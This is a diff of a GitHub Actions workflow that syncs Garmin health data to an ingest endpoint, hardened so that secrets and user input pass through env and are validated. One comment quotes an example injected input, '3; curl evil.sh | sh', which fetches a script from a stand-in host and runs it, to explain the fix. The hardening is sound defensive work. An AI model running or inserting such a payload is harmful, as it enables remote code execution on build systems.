@@ -1,78 +1,77 @@
-# Path A: run the sync in the cloud every morning.
-#
-# Copy this file to .github/workflows/garmin-sync.yml in your own repo, with
-# sync_garmin.py and requirements.txt at the repo root.
-#
-# Repo settings > Secrets and variables > Actions, add:
-#   GARMIN_TOKEN_B64     contents of garmin-ci-token.txt (from --export-ci-token)
-#   GARMIN_INGEST_URL    your https ingest endpoint   (skip if using files mode)
-#   SESSION_LOG_SECRET   the shared secret it checks  (skip if using files mode)
-#
-# Then open the Actions tab and click "Run workflow" once to confirm a green run.
+name: garmin-sync
 
-name: Garmin sync
-
+# Pulls Garmin Connect activities + daily wellness and POSTs them to the Nextmind
+# ingest endpoint. Deliberately on GitHub Actions, not Vercel Cron: garminconnect
+# is a Python lib with a native TLS dependency (curl_cffi) and there is no official
+# Garmin API, so this cannot run in the serverless Node runtime.
+#
+# Auth: the token bundle is seeded ONCE locally (`python sync_garmin.py --login`,
+# which answers 2FA) and stored as the GARMIN_TOKEN_B64 secret. CI restores it and
+# the lib refreshes silently. Re-seed only if the refresh token expires (~1yr).
+#
+# Paths below assume the script lives at scripts/garmin/ in this repo. If you
+# copied it somewhere else, adjust the two paths and nothing else.
 on:
   schedule:
-    # 12:00 UTC daily. Cron here is always UTC, so pick the UTC time that
-    # lands in your morning (12:00 UTC = 5am PT / 8am ET / 1pm UK).
-    - cron: "0 12 * * *"
-  workflow_dispatch: {}
+    - cron: "0 9 * * *" # 09:00 UTC = 05:00 ET, before context-rebuild (09:00) + brief (10:30)
+  workflow_dispatch:
+    inputs:
+      days:
+        description: "Days back to pull"
+        required: false
+        default: "3"
 
-# Never let two syncs overlap.
 concurrency:
   group: garmin-sync
   cancel-in-progress: false
 
+# This job only reads the repo. It never pushes, comments, or opens anything,
+# so it does not get the default read/write token.
+permissions:
+  contents: read
+
 jobs:
   sync:
     runs-on: ubuntu-latest
-    # Read-only against your own repo; nothing is pushed back by default.
-    permissions:
-      contents: read
-
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@v4
 
       - uses: actions/setup-python@v5
         with:
-          python-version: "3.11"
-          cache: pip
+          python-version: "3.12"
 
-      - name: Install dependencies
-        run: pip install -r requirements.txt
+      - run: pip install -r scripts/garmin/requirements.txt
 
-      - name: Pull Garmin data
+      - name: Restore Garmin token bundle
+        # The secret goes through env, never through ${{ }} interpolated into the
+        # script body: interpolation pastes a year of account access into the
+        # shell text itself, where a `set -x` or a crash dump can surface it.
         env:
-          # The yearly login token. Re-run --login and --export-ci-token when
-          # it expires or your Garmin password changes.
           GARMIN_TOKEN_B64: ${{ secrets.GARMIN_TOKEN_B64 }}
+        run: |
+          set -euo pipefail   # hygiene; the guard below is what actually gives
+                              # a missing secret a readable error
+          if [ -z "${GARMIN_TOKEN_B64:-}" ]; then
+            echo "::error::GARMIN_TOKEN_B64 is not set. Seed it locally with --login then --export-ci-token."
+            exit 1
+          fi
+          mkdir -p "$HOME/.garminconnect"
+          chmod 700 "$HOME/.garminconnect"
+          printf '%s' "$GARMIN_TOKEN_B64" | base64 -d | tar -xzf - -C "$HOME/.garminconnect"
+          chmod -R go-rwx "$HOME/.garminconnect"
+
+      - name: Run Garmin sync
+        # DAYS goes through env too. It is a workflow_dispatch input, i.e. text a
+        # human types, and interpolating it straight into `run:` would let
+        # "3; curl evil.sh | sh" execute as part of this step.
+        env:
+          DAYS: ${{ github.event.inputs.days || '3' }}
           GARMIN_INGEST_URL: ${{ secrets.GARMIN_INGEST_URL }}
           GARMIN_INGEST_SECRET: ${{ secrets.SESSION_LOG_SECRET }}
-        # 3 days, not 1: Garmin backfills sleep and HRV for a night or two,
-        # and re-running a day simply overwrites it.
-        run: python sync_garmin.py --days 3 --sink supabase
-
-      # --- Files mode instead of a database -------------------------------
-      #
-      # If you have no ingest endpoint, replace the step above with:
-      #
-      #   run: python sync_garmin.py --days 3 --sink files --out ./garmin
-      #
-      # and uncomment the step below to commit the notes back to this repo.
-      #
-      # Think about this one first: it puts your sleep, HRV and resting heart
-      # rate in a git repo. Fine in a PRIVATE repo you own. Do not do it in a
-      # public one. Path B (local cron) keeps the data on your own machine.
-      #
-      # You also need to raise the job's permissions above to:
-      #   permissions:
-      #     contents: write
-      #
-      # - name: Commit the notes
-      #   run: |
-      #     git config user.name "garmin-sync"
-      #     git config user.email "garmin-sync@users.noreply.github.com"
-      #     git add garmin
-      #     git diff --staged --quiet || git commit -m "Garmin sync $(date -u +%F)"
-      #     git push
+        run: |
+          set -euo pipefail
+          case "$DAYS" in
+            ''|*[!0-9]*) echo "::error::days must be a whole number, got: $DAYS"; exit 1 ;;
+          esac
+          python scripts/garmin/sync_garmin.py --days "$DAYS" --sink supabase
